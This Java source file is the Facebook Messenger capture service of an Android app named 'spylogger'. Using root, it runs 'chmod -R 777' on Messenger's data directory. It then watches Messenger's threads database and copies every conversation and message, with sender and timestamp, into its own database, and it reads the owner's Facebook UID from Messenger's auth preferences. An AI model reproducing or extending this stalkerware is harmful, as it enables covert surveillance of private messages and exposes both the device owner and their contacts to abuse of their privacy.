package com.gravatasufoca.spylogger.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Binder;
import android.os.FileObserver;
import android.os.IBinder;
import android.util.Log;

import com.gravatasufoca.spylogger.dao.DatabaseHelper;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookPrefs;
import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookThreads;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.model.messenger.Contact;
import com.gravatasufoca.spylogger.model.messenger.Messages;
import com.gravatasufoca.spylogger.model.messenger.Prefs;
import com.gravatasufoca.spylogger.model.messenger.Sender;
import com.gravatasufoca.spylogger.model.messenger.Thread;
import com.gravatasufoca.spylogger.utils.Utils;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.dao.GenericRawResults;
import com.j256.ormlite.field.DataType;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class MessengerService extends Service {

    private String pathToWatch;
    private String inFileName;
    private Dao<Messages, Integer> daoMsgExternal;

    private DatabaseHelper dbHelper;

    private DatabaseHelperFacebookThreads external;
    private final IBinder mBinder = new LocalBinder();
    private Contact proprietario;

    public class LocalBinder extends Binder {
        MessengerService getService() {
            return MessengerService.this;
        }
    }

    public MessengerService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return mBinder;
    }

    private void chmod() {

        try {
            CommandCapture command = new CommandCapture(0, "chmod -R 777 "
                    + Utils.FACEBOOK_DIR_PATH, "chmod -R 777 "
                    + getApplicationContext().getPackageManager()
                    .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir);

            if (RootTools.isAccessGiven())
                RootTools.getShell(true).add(command);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public void onCreate() {
        pathToWatch = DatabaseHelperFacebookThreads.DATABASE_NAME;
        try {
            inFileName = getApplicationContext().getPackageManager()
                    .getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
                    + "/databases/" + DatabaseHelper.DATABASE_NAME;
        } catch (NameNotFoundException e) {
            e.printStackTrace();
        }

        chmod();
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if ((new File(DatabaseHelperFacebookThreads.DATABASE_NAME)).exists()) {
            Log.d("FACESLOG - FLAGS", Integer.toString(flags));
            Utils.context = getApplicationContext();
            updateTopicos();

            if (Utils.faceObserver == null)
                setObserver();

            Log.d("FACESLOG - OBSESRVER", Utils.faceObserver.toString());
        }
        return START_REDELIVER_INTENT;
    }

    private void setObserver() {
        Utils.faceObserver = new FileObserver(pathToWatch) { // set up a file observer to
            // watch this directory on
            // sd card

            @Override
            public void onEvent(int event, String file) {

                switch (event) {
                    case FileObserver.MODIFY:
                        Log.d("FACES LOGGER", "MODIFY:" + pathToWatch + file);
                        proprietario = getProprietario(getApplicationContext());

                        updateTopicos();
                        break;
                    default:
                        // just ignore
                        break;
                }

            }
        };
        Utils.faceObserver.startWatching(); // START OBSERVING
    }

    private void updateTopicos() {
        external = new DatabaseHelperFacebookThreads(getApplicationContext());
        dbHelper = new DatabaseHelper((getApplicationContext()));
        GenericRawResults<Object[]> raws = null;
        try {
            dbHelper.getWritableDatabase();
            daoMsgExternal = external.getMessagesDao();

            daoMsgExternal.executeRaw("attach database '" + inFileName + "' as 'localdb' ");


            raws = daoMsgExternal.queryRaw("select thread_key,snippet,senders,snippet_sender, timestamp_ms from threads where thread_key not in( select idReferencia from localdb.topico where tipoMensagem=1 )",
                    new DataType[]{DataType.STRING, DataType.STRING, DataType.STRING, DataType.STRING, DataType.DATE_LONG});
            List<String> sThread = new ArrayList<>();

            List<Topico> tt = new ArrayList<>();
            Iterator<Object[]> iterator = raws.iterator();
            int contador = 0;
            while (iterator.hasNext()) {

                Object[] raw = iterator.next();

                Thread thread = new Thread();
                thread.setThread_key((String) raw[0]);
                thread.setSnippet(raw[1] != null ? (String) raw[1] : null);
                thread.setTsenders(raw[2] != null ? (String) raw[2] : null);
                thread.setTsnippet_sender(raw[3] != null ? (String) raw[3] : null);
                thread.setTimestamp_ms(raw[4] != null ? (Date) raw[4] : null);

                Topico topico = new Topico.TopicoBuilder()
                        .setIdReferencia(thread.getThread_key())
                        .setNome(thread.getNomes(proprietario))
                        .setGrupo(thread.getSenders() != null && thread.getSenders().size() > 2)
                        .build(TipoMensagem.MESSENGER);
                tt.add(topico);
                contador++;
                if (iterator.hasNext()) {
                    if (contador == 500) {
                        contador = 0;
                        dbHelper.getDao(Topico.class).create(tt);
                        tt = new ArrayList<>();
                    }
                } else {
                    dbHelper.getDao(Topico.class).create(tt);
                }
            }

            updateMsg(tt);

        } catch (Exception e) {
            Log.e(this.getClass().getSimpleName(), e.getMessage());
        } finally {
            try {
                if (raws != null) {
                    raws.close();
                }
            } catch (IOException e) {
            }
        }

    }


    private void updateMsg(List<Topico> tt) {
        GenericRawResults<Object[]> rawResults = null;
        try {

            rawResults = daoMsgExternal.queryRaw("select msg_id,thread_key,text,sender,timestamp_ms from messages where msg_id not in( select idReferencia from localdb.mensagem )",
                    new DataType[]{DataType.STRING, DataType.STRING, DataType.STRING, DataType.STRING, DataType.DATE_LONG});

            Iterator<Object[]> iterator = rawResults.iterator();

            List<Mensagem> mensagens = new ArrayList<>();
            int contador = 0;
            while (iterator.hasNext()) {
                Object[] raw = iterator.next();

                Messages message = new Messages();
                message.setMsg_id(raw[0] != null ? (String) raw[0] : null);
                message.setThread_key(raw[1] != null ? (String) raw[1] : null);
                message.setText(raw[2] != null ? (String) raw[2] : null);
                message.setTsender(raw[3] != null ? (String) raw[3] : null);
                message.setTimestamp_ms(raw[4] != null ? (Date) raw[4] : null);

                Sender sender = message.getSender();
                if (sender == null) continue;
                Contact contato = sender.getContato();
                boolean remetente = contato.equals(proprietario);

                Topico tmpTopico = null;
                for (Topico topico : tt) {
                    if (message.getThread_key().equals(topico.getIdReferencia())) {
                        tmpTopico = topico;
                        break;
                    }
                }
                if (tmpTopico == null) {
                    tmpTopico = dbHelper.getDao(Topico.class).queryForFirst(dbHelper.getDao(Topico.class).queryBuilder().where().eq("idReferencia", message.getThread_key()).prepare());
                }

                Mensagem mensagem = new Mensagem.MensagemBuilder()
                        .setIdReferencia(message.getMsg_id())
                        .setRemetente(remetente)
                        .setTexto(message.getText())
                        .setData(message.getTimestamp_ms())
                        .setDataRecebida(message
                                .getTimestamp_ms())
                        .setTamanhoArquivo(0)
                        .setTipoMidia(TipoMidia.TEXTO)
                        .setContato(sender.getNome())
                        .setTopico(tmpTopico)
                        .setTemMedia(false).build();

                mensagens.add(mensagem);
                contador++;
                if (iterator.hasNext()) {
                    if (contador == 10000) {
                        contador = 0;
                        dbHelper.getDao(Mensagem.class).create(mensagens);
                        mensagens = new ArrayList<>();
                    }
                } else {
                    dbHelper.getDao(Mensagem.class).create(mensagens);
                }
            }

            Log.i(this.getClass().getSimpleName(), "TERMINOU");
        } catch (Exception e) {
            try {
                if (rawResults != null) {
                    rawResults.close();
                }
            } catch (IOException ee) {
            }
        }
    }

    private Contact getProprietario(Context context) {
        try {

            String uid = context.getSharedPreferences(Utils.PREF, 0).getString("UID", "");
            if (!uid.isEmpty())
                return Utils.getContato(uid);

            Dao<Prefs, Integer> dao = (new DatabaseHelperFacebookPrefs(context)).getPrefsDao();
            List<Prefs> prefs = dao.queryForAll();

            for (Prefs pref : prefs) {
                if (pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_uid")) {
                    context.getSharedPreferences(Utils.PREF, 0).edit().putString("UID", pref.getValue()).commit();

                    return Utils.getContato(pref.getValue());
                } else if (pref.getKey().trim().equalsIgnoreCase("/auth/user_data/fb_me_user")) {
                    try {
                        JSONObject json = new JSONObject(pref.getValue());
                        context.getSharedPreferences(Utils.PREF, 0).edit().putString("UID", json.getString("uid")).commit();

                        return Utils.getContato(json.getString("uid"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }

            }

        } catch (SQLException e) {
            e.printStackTrace();
        }
        return new Contact();
    }
}